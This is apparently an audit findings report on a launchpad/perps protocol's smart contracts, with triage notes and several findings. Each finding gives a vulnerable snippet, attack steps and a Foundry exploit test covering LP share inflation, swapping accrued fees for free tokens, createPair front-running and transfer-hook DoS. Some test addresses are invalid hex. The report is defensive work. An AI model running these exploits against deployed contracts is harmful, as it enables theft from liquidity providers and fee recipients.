# 2025 08 gte perps - Findings Report
## Commit hash: f43e1eedb65e7e0327cfaf4d7608a37d85d2fae7

## LEGIT ISSUES FOUND

#1 HIGH - H-2/H-3/H-16/M-7 - (H-14(r1) && H-5(r1) is dup)
#3 HIGH - H-5
#6 HIGH - H-8(r1)/ H-10(r1)/ H-18(r1) - H-15 is dup
#2 MEDIUM - M-4/M-13(r1)/M-19(r1)
#4 MEDIUM - M-9 (M-25 (r1) dup) - pick best to demo 
#5 MEDIUM - M-11 (M-27 (r1) dup) - pick best to demo 


 **Derived From** : IERC20(token0).balanceOf(address/(this)) == uint256(reserve0) + uint256(accruedLaunchpadFee0) && IERC20(token1).balanceOf(address(this)) == uint256(reserve1) + uint256(accruedLaunchpadFee1)

 ## TODO - SUBMIT consolidated submission
[H-2]. LP share inflation: mint() credits depositor with unpaid launchpad fees included in balances, diluting LPs and stealing fee pot - **LEGIT**
[H-3]. Swap mis-accounts accrued fees as fresh input; attacker drains rewards by swapping accrued fees into the other token - **LEGIT** 



 **Derived From** : Anyone can front-run createPair to block Launchpad metadata and capture canonical pair

# TODO 
# This is the same root cause as your earlier M-13/M-19 factory front- run/metadata issues. Submit a single consolidated Medium covering:
# Front-running createPair blocks launchpad metadata and fee siphon
# Pairs initialized with zeroed addresses
# getPair keyed only by tokens, not including metadata
==>
[M-4]. Permissionless createPair lets any EOA permanently block Launchpad-initialized pair and disable 0.1% fee siphon - **LEGIT**



 **Derived From** : Liquidations place IOC orders with limitPrice=0 (no slippage bound)

[H-5]. Unbounded-price IOC fills during standard liquidation enable adversarial book to force extreme prices and induce bad debt -- **LEGIT**


 **Derived From** : price0CumulativeLast_post >= price0CumulativeLast_pre && price1CumulativeLast_post >= price1CumulativeLast_pre

[M-7]. Same-timestamp burn siphons undistributed launchpad fees due to timeElapsed gate in _update (fee misallocation to attacker LP)- **DUP** combine with H‑2/H‑3/H‑16.- **DUP** with H‑2/H‑3/H‑16.


 **Derived From** : On success: getRewardsPoolData(launchAsset).quoteAsset == quoteAsset and getRewardsPoolData(quoteAsset).quoteAsset == address(0); any subsequent createRewardsPair using either asset reverts

[M-9]. Pool-aliasing via mismatched addRewards breaks state machine and DoS’s claims for a pair -- **LEGIT** same as M-25 (r1)**



 **Derived From** : once unlocked == true, it never returns to false

[M-11]. Unlock makes endRewards() unreachable: rewards never terminate post-unlock enabling indefinite reward farming **LEGIT** same as M-27 (r1)



 **Derived From** : cancelWithdrawal uses O(n) full-queue copy; gas DoS via large queue

[H-15]. Unbounded O(n) copy in GTL.cancelWithdrawal lets any EOA gas-DoS cancels by inflating _withdrawalQueue -- **LEGIT use r1 version**



 **Derived From** : If the tx emits LaunchpadFeesAccrued(f0,f1), then accruedLaunchpadFee0_post == accruedLaunchpadFee0_pre + f0 && accruedLaunchpadFee1_post == accruedLaunchpadFee1_pre + f1

# TODO - Do not submit H‑16 as a separate High. Fold it into the consolidated AMM fee‑accounting report with H‑2 and H‑3 (r1) and M-7 from (r2), presenting:
[H-16]. Same-block accrual shrinks stored reserves (k) enabling underpriced second swap to extract value -- **LEGIT - combine wiht H-2/H-3**


### Number of Findings
- C: 0
- H: 7
- M: 7
- L: 2
- I: 0

##Findings by Pattern


 **Derived From** : Token transfer hook makes untrusted external calls; launchpad can freeze transfers

## [M-1]. LaunchToken transfer hook makes unguarded external callbacks; downstream revert bricks transfers touching bondingShare -- **LOW/INFORMATIONAL**

## Derived From Pattern/Invariant
Token transfer hook makes untrusted external calls; launchpad can freeze transfers

## Exploit Type
Dos

## Location
LaunchToken._decreaseFeeShares

## Minimim Privilege Required
Permissionless

## Description
LaunchToken._increaseFeeShares/_decreaseFeeShares update internal accounting then call ILaunchpad hooks without try/catch. If Launchpad (or anything it calls) reverts, any transfer invoking these hooks reverts too. During bonding (unlocked=false), even zero-amount ERC20 transfers from non-launchpad senders are rejected by LaunchToken, so if Launchpad’s callback routes a LaunchToken transfer from a non-launchpad address (e.g., Distributor payout), it reverts with TransfersDisabledWhileBonding, permanently griefing transfers for accounts with nonzero bondingShare. Vulnerable snippet:

function _decreaseFeeShares(address account, uint256 amount) internal {
  ...
  if (totalFeeShare == 0 && !unlocked) _endRewards(); // external call
  ILaunchpad(launchpad).decreaseStake(account, uint96(amount)); // external call
}

Same pattern in _increaseFeeShares and _endRewards.

## Impact
LaunchToken performs external callbacks to Launchpad/Distributor from inside _beforeTokenTransfer. Any revert in those callbacks reverts the token transfer. During bonding, if Distributor attempts to pay rewards in the LaunchToken itself, those payouts call LaunchToken.transfer(from=Distributor,to=user) and revert with TransfersDisabledWhileBonding, bricking any transfer that updates bonding shares (e.g., launchpad distributions or user sells via router). Even after unlock, the same DoS can be triggered if Distributor holds a malicious reward token that reverts on payout; transfers that touch bondingShare will continue to fail until admins reconfigure rewards or disable hooks. This is a repeatable DoS of core flows requiring admin intervention.

## Proof of Concept
Minimal scenario (no special privileges):
1) The launch token is in bonding (unlocked == false).
2) Launchpad seeds Distributor with some LaunchToken to stream as rewards (allowed: transfers from launchpad are permitted pre-unlock).
3) Any stake update (launchpad distributing tokens to a user or a user attempting to sell via the router) triggers LaunchToken._increaseFeeShares/_decreaseFeeShares → Launchpad.increaseStake/decreaseStake → Distributor pays pending rewards.
4) Distributor attempts to transfer LaunchToken to the user while unlocked == false. This is a transfer from a non-launchpad address to a non-whitelisted address; LaunchToken._beforeTokenTransfer reverts with TransfersDisabledWhileBonding.
5) The revert bubbles up and bricks the original transfer. As long as LaunchToken is included in rewards during bonding, all transfers that touch bondingShare accounts will revert.
Permissionless variant: An attacker can donate a “toxic” reward token (one that reverts on transfer out) to Distributor via addRewards. On any stake update, the payout of that asset reverts, bricking LaunchToken transfers that trigger the callback, until admins remove the asset or disable hooks.

## Proof of Code
pragma solidity 0.8.27;
import "forge-std/Test.sol";
import {LaunchToken} from "contracts/launchpad/LaunchToken.sol";

interface ILaunchpad { function increaseStake(address,uint96) external; function decreaseStake(address,uint96) external; function endRewards() external; }

// Simulates a downstream component (e.g., Distributor) that performs a LaunchToken transfer
// during Launchpad.increaseStake, which will revert pre-unlock because sender != launchpad.
contract PoisonPayout {
    LaunchToken public token;
    constructor(LaunchToken _token) { token = _token; }
    function pay(address to) external {
        // Even zero-amount hits LaunchToken._beforeTokenTransfer and reverts while unlocked == false
        token.transfer(to, 0);
    }
}

contract MockLaunchpad is ILaunchpad {
    LaunchToken public token;
    PoisonPayout public poison;
    constructor(address router) {
        // Deploy LaunchToken from this contract so `launchpad = address(this)` inside token
        token = new LaunchToken("L", "L", "uri", router);
        // Mint supply to launchpad (allowed by onlyLaunchpad)
        token.mint(1_000 ether);
        // Install a payout path that attempts a LaunchToken transfer during stake updates
        poison = new PoisonPayout(token);
    }
    function airdrop(address to, uint256 amt) external {
        // Simulate bonding-phase distribution: from == launchpad → triggers _increaseFeeShares
        token.transfer(to, amt);
    }
    // Called by LaunchToken._increaseFeeShares
    function increaseStake(address account, uint96) external override {
        // Simulate downstream payout using LaunchToken, which reverts pre-unlock
        poison.pay(account);
    }
    function decreaseStake(address, uint96) external override { }
    function endRewards() external override { }
}

contract GriefableCallbacksTest is Test {
    function test_DoS_TransferHookGrief_PreUnlock() public {
        address router = address(0xBEEF);
        MockLaunchpad L = new MockLaunchpad(router);
        LaunchToken t = L.token();
        address alice = address(0xA11CE);

        // Precondition: bonding phase (unlocked == false)
        assertEq(t.unlocked(), false);

        // Attempt to transfer from launchpad → triggers _increaseFeeShares → calls Launchpad.increaseStake → PoisonPayout.pay
        // PoisonPayout.pay tries LaunchToken.transfer from a non-launchpad address while unlocked=false → reverts in _beforeTokenTransfer
        vm.expectRevert(LaunchToken.TransfersDisabledWhileBonding.selector);
        L.airdrop(alice, 1 ether);
    }
}


## Suggested Mitigation
Avoid making LaunchToken transfers depend on untrusted external code during the ERC20 transfer hook, and prevent LaunchToken payouts during bonding:
- In Distributor: disallow LaunchToken as a payout asset while launchToken.unlocked() == false. Instead, accrue pending LaunchToken rewards and pay them only after unlock (on next stake update or user claim). Also consider rejecting obviously non-standard/toxic tokens (or gating addRewards by allowlist) to prevent permissionless DoS via malicious assets.
- In LaunchToken: if callbacks must remain, add a circuit breaker: an owner-controlled "hooksEnabled" flag and a try/catch around ILaunchpad.increaseStake/decreaseStake/endRewards. On failure, revert local share changes and emit an event, but do not block the ERC20 transfer; admins can re-enable hooks after fixing rewards config. This preserves transfer liveness.
- Alternatively, explicitly allowlist the Distributor in _beforeTokenTransfer (from == distributor) during bonding if LaunchToken payouts before unlock are a requirement. Ensure the Distributor’s public functions cannot be abused to bypass bonding restrictions (e.g., only controlled payout paths).
These measures remove the ability for downstream reverts to brick LaunchToken transfers while keeping reward accounting correct or recoverable.





 **Derived From** : IERC20(token0).balanceOf(address(this)) == uint256(reserve0) + uint256(accruedLaunchpadFee0) && IERC20(token1).balanceOf(address(this)) == uint256(reserve1) + uint256(accruedLaunchpadFee1)

## [H-2]. LP share inflation: mint() credits depositor with unpaid launchpad fees included in balances, diluting LPs and stealing fee pot

## Derived From Pattern/Invariant
IERC20(token0).balanceOf(address(this)) == uint256(reserve0) + uint256(accruedLaunchpadFee0) && IERC20(token1).balanceOf(address(this)) == uint256(reserve1) + uint256(accruedLaunchpadFee1)

## Exploit Type
AccountingInvariantViolation

## Location
GTELaunchpadV2Pair.mint

## Minimim Privilege Required
Permissionless

## Description
Reserves are stored net of launchpad fees, but mint() computes deposit amounts from raw token balances. If accruedLaunchpadFee{0,1} > 0 (fees accrued but not yet distributed), then before _update, balanceX = reserveX + accruedLaunchpadFeeX. In mint(), amountX = balanceX - _reserveX, which equals depositorTokensX + accruedLaunchpadFeeX. The depositor is thus credited with the pending launchpad fees as if they were provided liquidity, minting excess LP shares for free. Vulnerable snippets:

- In mint():
  amount0 = balance0.sub(_reserve0);
  amount1 = balance1.sub(_reserve1);

- Reserves are net-of-fees in _update():
  reserve0 = _reserve0 = uint112(balance0) - (accruedLaunchpadFee0 + newLaunchpadFee0);
  reserve1 = _reserve1 = uint112(balance1) - (accruedLaunchpadFee1 + newLaunchpadFee1);

Because accrued fees sit in contract balance until a later distribution window (timeElapsed > 0 path), a permissionless attacker can front-run fee distribution and call mint after transferring minimal tokens to the pair, inflating shares by the unpaid fee amounts. This violates the balance accounting intent and diverts the launchpad fees to the attacker when they later burn LP.

## Impact
Accrued launchpad fees remain in the pair’s ERC20 balances while reserves are stored net-of-fees. mint() computes amount0/amount1 from raw balances minus net reserves, so any unpaid fees are counted as if the minter deposited them. A user can mint in the same block after a swap (before distribution) and receive extra LP shares backed by other LPs’ reserves. This is permissionless, yields immediate extractable value via burn, and dilutes existing LPs (the loss equals roughly totalSupply * accruedFee / reserve on the limiting side).

## Proof of Concept
Exploit outline (no hardcoded storage):
1) Ensure launchpadLp initially owns the LP supply (typical in production; set launchpadLp = the initial LP provider). Seed the pool with balanced liquidity.
2) In the same block, a trader performs a swap that pays launchpad fees. The pair’s _update() (timeElapsed == 0 path) accrues fees into accruedLaunchpadFee{0,1} and stores reserves net-of-fees, but does not distribute. Thus: IERC20.balance = reserves + accruedFees.
3) Attacker transfers tiny d0 on the fee-bearing side and d1 on the opposite side chosen so that min(amount0 * S / R0, amount1 * S / R1) is limited by (F + d0) on the fee side (i.e., set d1 >= (F + d0) * R1 / R0 if F is on token0). Then calls mint().
4) mint() computes amountX = balanceX - _reserveX. Because reserves are net-of-fees and balances contain fees, amount on the fee side equals F + d0. Liquidity minted is inflated by ~ S * F / R (beyond the user’s deposit), stealing value from existing LPs. The attacker can immediately burn LP to realize the gain.

## Proof of Code
pragma solidity 0.8.27;
import "forge-std/Test.sol";
import {GTELaunchpadV2Pair} from "contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol";

interface IFactory { function feeTo() external view returns (address); }

contract MockFactory is IFactory {
    address public override feeTo; // zero by default -> feeOn = false
    function setFeeTo(address a) external { feeTo = a; }
    function createPair(address t0, address t1, address lp, address dist) external returns (GTELaunchpadV2Pair p) {
        p = new GTELaunchpadV2Pair();
        p.initialize(t0, t1, lp, dist);
    }
}

contract ERC20Mock {
    string public name; string public symbol; uint8 public decimals = 18;
    mapping(address=>uint256) public balanceOf;
    mapping(address=>mapping(address=>uint256)) public allowance;
    constructor(string memory n,string memory s){name=n;symbol=s;}
    function mint(address to,uint v) external { balanceOf[to]+=v; }
    function transfer(address to,uint v) external returns(bool){ require(balanceOf[msg.sender]>=v); balanceOf[msg.sender]-=v; balanceOf[to]+=v; return true; }
    function approve(address sp,uint v) external returns(bool){ allowance[msg.sender][sp]=v; return true; }
    function transferFrom(address f,address t,uint v) external returns(bool){ require(balanceOf[f]>=v && allowance[f][msg.sender]>=v); allowance[f][msg.sender]-=v; balanceOf[f]-=v; balanceOf[t]+=v; return true; }
}

contract MintInflationExploitTest is Test {
    MockFactory factory;
    ERC20Mock token0; ERC20Mock token1;
    GTELaunchpadV2Pair pair;

    address lpProvider = address(0xLPLP);
    address launchpadFeeDistributor = address(0xD1ST);
    address trader = address(0xTRADE);
    address attacker = address(0xA11CE);

    function setUp() public {
        factory = new MockFactory();
        token0 = new ERC20Mock("T0","T0");
        token1 = new ERC20Mock("T1","T1");
        // IMPORTANT: set launchpadLp = lpProvider so it effectively owns the LP supply
        pair = factory.createPair(address(token0), address(token1), lpProvider, launchpadFeeDistributor);

        // Seed initial liquidity from lpProvider
        token0.mint(lpProvider, 1_000e18);
        token1.mint(lpProvider, 1_000e18);
        vm.startPrank(lpProvider);
        token0.transfer(address(pair), 1_000e18);
        token1.transfer(address(pair), 1_000e18);
        pair.mint(lpProvider);
        vm.stopPrank();
    }

    function _getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) internal pure returns (uint amountOut) {
        // UniswapV2 formula with 0.3% fee accounted in the invariant check
        uint amountInWithFee = amountIn * 997;
        uint numerator = amountInWithFee * reserveOut;
        uint denominator = reserveIn * 1000 + amountInWithFee;
        amountOut = numerator / denominator;
    }

    function test_mintInflatesByAccruedFees_sameBlockAfterSwap() public {
        // Trader performs a swap to accrue launchpad fees (timeElapsed == 0 to avoid distribution)
        (uint112 R0, uint112 R1,) = pair.getReserves();
        uint amount0In = 100e18; // arbitrary
        token0.mint(trader, amount0In);
        vm.startPrank(trader);
        token0.transfer(address(pair), amount0In);
        uint amount1Out = _getAmountOut(amount0In, R0, R1);
        pair.swap(0, amount1Out, trader, new bytes(0));
        vm.stopPrank();

        // Fees have accrued on token0 side into balances while reserves are net-of-fees
        (uint112 accF0, uint112 accF1,) = pair.getAccruedLaunchpadFees();
        assertGt(accF0, 0, "no accrued fee on token0");

        // Attacker now mints to capture F0 in amount calculation
        // Choose tiny d0 and enough d1 so liquidity is limited by (F0 + d0) on token0 side
        uint d0 = 1e9; // tiny > 0 to avoid zero-liquidity on token0 side
        uint d1 = (uint(accF0) + d0) * uint(R1) / uint(R0) + 1;
        token0.mint(attacker, d0);
        token1.mint(attacker, d1);

        vm.startPrank(attacker);
        token0.transfer(address(pair), d0);
        token1.transfer(address(pair), d1);

        uint tsBefore = pair.totalSupply();
        (R0, R1,) = pair.getReserves();

        uint liquidity = pair.mint(attacker);
        vm.stopPrank();

        // Baseline liquidity from deposits only (no fee credit) would be ~ ts * d0 / R0
        // We sized d1 large enough so min() is governed by token0 side
        uint baseline = tsBefore * d0 / uint(R0);
        // Extra inflated liquidity attributable to the accrued fee on token0 should be ~ ts * F0 / R0
        uint expectedExtra = tsBefore * uint(accF0) / uint(R0);

        // Check that minted LP includes the accrued fee component (allow modest rounding slack)
        assertGt(liquidity, baseline + (expectedExtra * 95) / 100, "LP not inflated by accrued fees");
    }
}


## Suggested Mitigation
In mint(), exclude unpaid launchpad fees from depositor credit. Two equivalent fixes:
- Compute gross reserves, then subtract them from balances to derive true deposits:
  uint112 f0; uint112 f1; (f0, f1,) = getAccruedLaunchpadFees();
  uint256 amount0 = balance0 - (uint256(_reserve0) + uint256(f0));
  uint256 amount1 = balance1 - (uint256(_reserve1) + uint256(f1));
  if (amount0 > balance0) amount0 = 0; if (amount1 > balance1) amount1 = 0; // safety
  Proceed with liquidity = min(amount0 * S / _reserve0, amount1 * S / _reserve1).

- Or, before computing amount0/amount1, pre-sync fee accounting so balances used for the mint calculation no longer include unpaid fees: call an internal function that computes totalLaunchpadFee{0,1} and subtracts them from the local balance variables used for amount calculation (do not distribute here; simply exclude them from depositor credit). Ensure burn/swap/mint treat pending fees consistently so users cannot capture them via timing.


## [H-3]. Swap mis-accounts accrued fees as fresh input; attacker drains rewards by swapping accrued fees into the other token

## Derived From Pattern/Invariant
IERC20(token0).balanceOf(address(this)) == uint256(reserve0) + uint256(accruedLaunchpadFee0) && IERC20(token1).balanceOf(address(this)) == uint256(reserve1) + uint256(accruedLaunchpadFee1)

## Exploit Type
AccountingInvariantViolation

## Location
GTELaunchpadV2Pair.swap

## Minimim Privilege Required
Permissionless

## Description
In GTELaunchpadV2Pair.swap, amount{0,1}In is computed from live balances vs stored reserves. Reserves are stored as balance - totalLaunchpadFees, so any undistributed accruedLaunchpadFee sits in the live balance but not in reserves. On the next swap in the same block (timeElapsed == 0), this accrued amount is incorrectly treated as new input (amountIn), satisfying the fee/K checks and enabling the attacker to withdraw the opposite token without providing their own input. Later in _update, the contract subtracts totalLaunchpadFee (accrued + new) and optionally distributes to Distributor, so the Distributor still receives the accrued tokens while the attacker already siphoned value in the other token. This effectively converts pending rewards into attacker profit (reward redirection). Vulnerable snippet (logic):

- reserves exclude fees: reserve[i] = uint112(balance[i]) - (accrued[i] + new[i])
- amountIn = balance[i] - (reserve[i] - amountOut[i]); accrued included in balance but excluded from reserve
- _getLaunchpadFees(amountIn) then over-derives new fees from accrued, further worsening accounting

Result: Attacker can repeatedly perform a second swap within the same block to treat accrued fees as input and drain the other token. LP pricing constraints still hold, but rewards (and a small extra fee-on-fee) are diverted.

## Impact
An attacker can treat previously accrued launchpad fees as fresh input on a same-block follow-up swap, allowing them to withdraw the opposite token without providing their own tokens. This directly redirects rewards from the launchpad fee recipient to the attacker, and the LP loses value in the opposite asset. The exploit is permissionless, repeatable, and yields immediate extractable value proportional to prior swap volume while also compounding via fee-on-fee accounting.

## Proof of Concept
Attack outline
- Precondition: launchpadFeeDistributor is set and rewardsPoolActive > 0; launchpadLp holds (nearly) all LP tokens so launchpad fee share is ~100%.
- Observation: _update() stores reserves as reserve = balance - (accrued + new) fees. During a subsequent swap in the same block, amountIn is derived from live balances vs stored reserves. The difference balance - reserve equals the pending fee tokens, which are interpreted as new input.
- Steps:
  1) Provide liquidity. Transfer minted LP tokens from the initial LP minter to launchpadLp so the launchpad fee share is non-zero and large.
  2) Do a normal swap (e.g., token0 -> token1) in a fresh block to generate non-zero launchpad fee0.
  3) In the same block, compute delta0 = IERC20(token0).balanceOf(pair) - reserve0 (from getReserves). This equals totalLaunchpadFee0 sitting in the pair.
  4) Compute amount1Out = getAmountOut(delta0, reserve0, reserve1) using the standard Uniswap formula (0.3% fee). Call pair.swap(0, amount1Out, attacker, ""). Do not send any token0 in this tx.
  5) The pair counts delta0 as amount0In, passes the K-check, and transfers amount1Out to the attacker. Later, when fees are distributed, the distributor still pulls the fee tokens (token0), but token1 was already siphoned to the attacker.
- Result: Rewards are converted into attacker profit in the opposite asset without the attacker providing input in the second swap.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {GTELaunchpadV2Pair} from "contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol";

interface IERC20Like {
    function balanceOf(address) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function mint(address to, uint256 amount) external;
}

contract MockERC20 is IERC20Like {
    string public name; string public symbol; uint8 public decimals = 18; uint256 public totalSupply;
    mapping(address=>uint256) public balanceOf; mapping(address=>mapping(address=>uint256)) public allowance;
    constructor(string memory n, string memory s){name=n;symbol=s;}
    function mint(address to,uint256 amt) external {balanceOf[to]+=amt; totalSupply+=amt;}
    function transfer(address to,uint256 amt) external returns(bool){require(balanceOf[msg.sender]>=amt,"bal"); balanceOf[msg.sender]-=amt; balanceOf[to]+=amt; return true;}
    function approve(address sp,uint256 amt) external returns(bool){allowance[msg.sender][sp]=amt; return true;}
    function transferFrom(address f,address t,uint256 a) external returns(bool){uint256 al=allowance[f][msg.sender]; require(al>=a && balanceOf[f]>=a,"allow/bal"); if(al!=type(uint256).max) allowance[f][msg.sender]=al-a; balanceOf[f]-=a; balanceOf[t]+=a; return true;}
}

contract StubDistributor { function addRewards(address,address,uint128,uint128) external {} }

contract SwapAccruedLeakTest is Test {
    GTELaunchpadV2Pair pair;
    MockERC20 t0; // token0
    MockERC20 t1; // token1
    StubDistributor dist;

    address launchpadLp = address(0xBEEF);
    address liqProvider = address(0xA11CE);
    address attacker = address(0xDEAD);

    // Make this test contract a valid "factory" for the pair
    function feeTo() external view returns (address) { return address(0); }

    function setUp() public {
        t0 = new MockERC20("T0","T0");
        t1 = new MockERC20("T1","T1");
        dist = new StubDistributor();

        pair = new GTELaunchpadV2Pair(); // factory = address(this)
        pair.initialize(address(t0), address(t1), launchpadLp, address(dist));

        // Seed liquidity
        t0.mint(liqProvider, 1_000_000 ether);
        t1.mint(liqProvider, 1_000_000 ether);
        vm.startPrank(liqProvider);
        t0.transfer(address(pair), 1_000_000 ether);
        t1.transfer(address(pair), 1_000_000 ether);
        pair.mint(liqProvider);
        // Move all LP to launchpadLp so launchpad fee share ~ 100%
        uint256 lp = pair.balanceOf(liqProvider);
        pair.transfer(launchpadLp, lp);
        vm.stopPrank();

        // Some dust for attacker accounting
        t0.mint(attacker, 1 ether);
        t1.mint(attacker, 1 ether);
    }

    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        uint256 amountInWithFee = amountIn * 997; // 0.3%
        uint256 numerator = amountInWithFee * reserveOut;
        uint256 denominator = reserveIn * 1000 + amountInWithFee;
        return numerator / denominator;
    }

    function test_AccruedFeesCountedAsFreshInput_sameBlock() public {
        // 1) First swap in a fresh block to accrue launchpad fees (on token0 side)
        vm.warp(1000);
        (uint112 r0a, uint112 r1a,) = pair.getReserves();
        uint256 in0 = 100_000 ether; // sizeable to generate visible fees
        uint256 out1 = _getAmountOut(in0, r0a, r1a);
        vm.startPrank(attacker);
        t0.transfer(address(pair), in0);
        pair.swap(0, out1, attacker, "");
        vm.stopPrank();

        // 2) Second swap in the SAME block: exploit accrued token0 fees as input to pull token1
        (uint112 r0b, uint112 r1b,) = pair.getReserves(); // reserves exclude total fees
        uint256 bal0 = t0.balanceOf(address(pair));
        uint256 accrued0 = bal0 - uint256(r0b); // equals totalLaunchpadFee0 pending in pair
        assertGt(accrued0, 0, "no accrued fee to exploit");

        uint256 stealOut1 = _getAmountOut(accrued0, r0b, r1b);
        uint256 atkT0Before = t0.balanceOf(attacker);
        uint256 atkT1Before = t1.balanceOf(attacker);

        vm.prank(attacker);
        pair.swap(0, stealOut1, attacker, ""); // no token0 sent in this tx

        uint256 atkT0After = t0.balanceOf(attacker);
        uint256 atkT1After = t1.balanceOf(attacker);

        // Attacker did not spend token0 in step 2
        assertEq(atkT0After, atkT0Before, "attacker provided token0 unexpectedly");
        // But received token1 funded by the accrued token0 fees
        assertEq(atkT1After - atkT1Before, stealOut1, "unexpected token1 gain");
    }
}


## Suggested Mitigation
Do not let previously accrued launchpad fees be treated as fresh swap input. In swap(), compute effective balances and reserves that exclude/include accrued fees respectively, then use those for both amountIn detection and the K-check:
- effBalance0 = balance0 - accruedLaunchpadFee0
- effBalance1 = balance1 - accruedLaunchpadFee1
- effReserve0 = _reserve0 + accruedLaunchpadFee0
- effReserve1 = _reserve1 + accruedLaunchpadFee1
Then:
- amount0In = effBalance0 > effReserve0 - amount0Out ? effBalance0 - (effReserve0 - amount0Out) : 0
- amount1In = effBalance1 > effReserve1 - amount1Out ? effBalance1 - (effReserve1 - amount1Out) : 0
- Use effBalance{0,1} in the adjusted K-check instead of raw balances.
Also ensure _getLaunchpadFees() is fed only the true swap inputs (amount{0,1}In computed above). This fully prevents accrued fees from being double-counted as input while keeping reserve/bookkeeping unchanged.





 **Derived From** : Anyone can front-run createPair to block Launchpad metadata and capture canonical pair

## [M-4]. Permissionless createPair lets any EOA permanently block Launchpad-initialized pair and disable 0.1% fee siphon -- **LEGIT**

## Derived From Pattern/Invariant
Anyone can front-run createPair to block Launchpad metadata and capture canonical pair

## Exploit Type
AuthByPass

## Location
GTELaunchpadV2PairFactory.createPair

## Minimim Privilege Required
Permissionless

## Description
GTELaunchpadV2PairFactory.createPair embeds launchpadLp/launchpadFeeDistributor only when msg.sender == launchpad, and includes these in the CREATE2 salt. However, the uniqueness check uses only getPair[token0][token1]. An attacker can call createPair(tokenA, tokenB) first (msg.sender != launchpad), which deploys a pair initialized with (lp=0, dist=0) and writes getPair[token0][token1]. Later, the Launchpad's call reverts with 'UniswapV2: PAIR_EXISTS'. This permanently prevents deploying the intended launchpad-enhanced pair, disabling the 0.1% launchpad fee stream and breaking downstream assumptions expecting a launchpad-initialized pool.

Vulnerable snippet:
function createPair(address tokenA, address tokenB) external returns (address pair) {
  ...
  (address _launchpadLp, address _launchpadFeeDistributor) =
    msg.sender == launchpad ? (launchpadLp, launchpadFeeDistributor) : (address(0), address(0));
  bytes32 salt = keccak256(abi.encodePacked(token0, token1, _launchpadLp, _launchpadFeeDistributor));
  assembly { pair := create2(0, add(bytecode, 32), mload(bytecode), salt) }
  IUniswapV2Pair(pair).initialize(token0, token1, _launchpadLp, _launchpadFeeDistributor);
  getPair[token0][token1] = pair; // uniqueness keyed only by tokens
  getPair[token1][token0] = pair;
  allPairs.push(pair);
}

## Impact
Permanent DoS of Launchpad’s intended pair deployment for a token pair; disables protocol’s 0.1% launchpad fee siphon and breaks integrations expecting launchpad-enhanced pairs. Requires admin redeploy/rotation to recover.

## Proof of Concept
- Attacker frontruns Launchpad, calling factory.createPair(tokenA, tokenB). Because msg.sender != launchpad, pair initializes with (lp=0, dist=0) and getPair[token0][token1] is set.
- Launchpad later calls createPair(tokenA, tokenB); revert with 'UniswapV2: PAIR_EXISTS'.
- Result: canonical pair is fixed without launchpad fee metadata; fee siphon and controls are permanently disabled for that pair.

## Proof of Code
pragma solidity 0.8.27;
import "forge-std/Test.sol";
import {GTELaunchpadV2PairFactory} from "contracts/launchpad/uniswap/GTELaunchpadV2PairFactory.sol";

contract DummyToken { /* minimal stub */ }

contract CreatePairAuthBypassTest is Test {
    GTELaunchpadV2PairFactory factory;
    address feeToSetter = address(0xA11CE);
    address launchpad    = address(0xBEEF);
    address launchpadLp  = address(0xCAFE);
    address feeDist      = address(0xFEE1);
    address attacker     = address(0xBAD);

    function setUp() public {
        factory = new GTELaunchpadV2PairFactory(feeToSetter, launchpad, launchpadLp, feeDist);
    }

    function test_FrontRunBlocksLaunchpadInitializedPair() public {
        address tokenA = address(new DummyToken());
        address tokenB = address(new DummyToken());
        // 1) Attacker creates the pair first (no launchpad metadata embedded)
        vm.prank(attacker);
        address pair1 = factory.createPair(tokenA, tokenB);
        assertTrue(pair1 != address(0));
        assertEq(factory.getPair(tokenA, tokenB), pair1);
        assertEq(factory.getPair(tokenB, tokenA), pair1);

        // 2) Launchpad attempts to create its intended pair; reverts due to getPair already populated
        vm.prank(launchpad);
        vm.expectRevert(bytes("UniswapV2: PAIR_EXISTS"));
        factory.createPair(tokenA, tokenB);
    }
}


## Suggested Mitigation
- Enforce onlyLaunchpad for createPair if the canonical pool must carry launchpad metadata; or
- Always compute uniqueness by the full salt (token0, token1, _launchpadLp, _launchpadFeeDistributor) and expose separate registries for canonical vs. non-launchpad pools; or
- Remove metadata from the CREATE2 salt and require that any first deployment must be performed by launchpad (revert otherwise), ensuring a single canonical pair with metadata. Additionally, if permissionless pairs are desired, separate them into a distinct factory or do not register non-launchpad pairs in getPair.





 **Derived From** : Liquidations place IOC orders with limitPrice=0 (no slippage bound)

## [H-5]. Unbounded-price IOC fills during standard liquidation enable adversarial book to force extreme prices and induce bad debt

## Derived From Pattern/Invariant
Liquidations place IOC orders with limitPrice=0 (no slippage bound)

## Exploit Type
SlippageMissingOrInsufficient

## Location
MarketLib.liquidate

## Minimim Privilege Required
Permissionless

## Description
MarketLib.liquidate submits a CLOB order with limitPrice=0 and tif=TiF.IOC: result = CLOBLib.placeOrder(account, PlaceOrderArgs({..., limitPrice: 0, tif: TiF.IOC, reduceOnly: true}), bookType). There is no slippage or time-bound guard, and BookLib.assertPriceInBounds(0) permits 0 as it satisfies tick divisibility. A mempool watcher can front-run a legitimate liquidator call, skew or dominate the book on the opposite side, and capture the full forced-close at an arbitrary price. For a liquidating long, the IOC SELL will cross the bid book; if liquidity is thin or cleared, the attacker’s ultra-low bid becomes best and the entire position fills at their low price. The liquidatee’s realized PnL (rpnl) becomes highly negative (bounded by -openNotional of the closed portion), pushing margin negative. LiquidatorPanel.liquidate then realizes bad debt (fee += cache.margin; delete cache.margin) and calls InsuranceFund.claim(abs(fee)), creating a direct, immediate fund loss. The attacker then closes their cheaply acquired opposing position at fair prices to realize profit. Vulnerable snippet:

- MarketLib.liquidate: PlaceOrderArgs({ limitPrice: 0, tif: TiF.IOC, reduceOnly: true })
- CLOBLib.placeOrder: allows limitPrice==0 when tif>1; expiryTime=0 (no deadline)
- No guard vs mark/index price

Effect: permissionless counterparties extract value from liquidations via adverse IOC fills, amplifying bad debt and directly draining the Insurance Fund.

## Impact
